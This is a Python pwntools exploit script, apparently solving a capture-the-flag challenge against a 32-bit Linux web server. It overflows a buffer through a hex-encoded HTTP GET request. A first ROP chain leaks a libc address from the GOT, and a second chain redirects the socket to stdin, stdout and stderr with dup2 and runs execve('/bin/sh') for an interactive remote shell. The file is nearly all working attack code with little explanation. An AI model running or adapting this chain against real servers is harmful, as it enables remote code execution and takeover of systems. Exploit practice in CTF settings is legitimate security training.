#!/usr/bin/python3
from pwn import *
context.update(arch='i386', os='linux', log_level='warning')

WEBSERVER=b"ec2-3-82-2-207.compute-1.amazonaws.com:80"

# REMOTE=('library.m0unt41n.ch', 31467, 'ipv4', 'tcp', False)
REMOTE=('127.0.0.1', 8080, 'ipv4', 'tcp', False)

# Create ROP payload #1
sockfd = 4
rop1 = 1024*b'D' + 32*b'U'  # overflow buf, addr, fd, EBP and padding
rop1 += p32(0x08048c35)     # send_http_error
rop1 += p32(0x08049435)     # where we want send_http_error to return (pop+pop gadget)
rop1 += p32(sockfd)         # fd
rop1 += p32(0x0804aed8)     # inet_ntoa() in GOT
rop1 += p32(0x08048600)     # read() in PLT
rop1 += p32(0xBABEBABE)     # something dummy
rop1 += p32(0x00000000)     # STDIN_FILENO
rop1 += p32(0x0804a670)     # safe buffer("TOP SECRET" string)
rop1 += p32(0x00000010)     # count

# Send ROP payload #1
io = remote(*REMOTE)
req = b"GET http://blah/hex_message:"+rop1.hex().encode('ascii')+b": HTTP/1.0\r\n"
req += b"Host: "+WEBSERVER+b"\r\n\r\n"
io.send(req)
b = io.recv(10240)
io.close()

# Find libc in the response
pos = b.find(b'<body><pre>')+len(b'<body>pre>')+1
inet_ntoa = b[pos]+(b[pos+1]<<8)+(b[pos+2]<<16)+(b[pos+3]<<24)
glibc = inet_ntoa - 0x00109d10
print("glibc: "+hex(glibc))

# Get gadgets
syscall = glibc + 0x000e795f     # "of sorts" :-)
pop_eax = glibc + 0x00024e1e
pop_ebx = glibc + 0x00018d05
pop_ecx = glibc + 0x00192891
pop_edx = glibc + 0x00001aae
bin_sh =  glibc + 0x0017e1db

# Create ROP payload #2
sockfd = 5
rop2 = 1024*b'D' + 32*b'U'
# sys_dup2(sockfd, STDIN_FILENO)
rop2 += p32(pop_eax) + p32(63)
rop2 += p32(pop_ebx) + p32(sockfd)
rop2 += p32(pop_ecx) + p32(0)
rop2 += p32(syscall)
# sys_dup2(sockfd, STDOUT_FILENO)
rop2 += p32(pop_eax) + p32(63)
rop2 += p32(pop_ebx) + p32(sockfd)
rop2 += p32(pop_ecx) + p32(1)
rop2 += p32(syscall)
# sys_dup2(sockfd, STDERR_FILENO)
rop2 += p32(pop_eax) + p32(63)
rop2 += p32(pop_ebx) + p32(sockfd)
rop2 += p32(pop_ecx) + p32(2)
rop2 += p32(syscall)
# sys_execve("/bin/sh", NULL, NULL)
rop2 += p32(pop_eax) + p32(11)
rop2 += p32(pop_ebx) + p32(bin_sh)
rop2 += p32(pop_ecx) + p32(0)
rop2 += p32(pop_edx) + p32(0)
rop2 += p32(syscall)

# Send ROP payload #2 and get a shell
req = b"GET http://blah/hex_message:"+rop2.hex().encode('ascii')+b": HTTP/1.0\r\n"
req += b"Host: "+WEBSERVER+b"\r\n\r\n"
io = remote(*REMOTE)
io.send(req)
io.interactive()
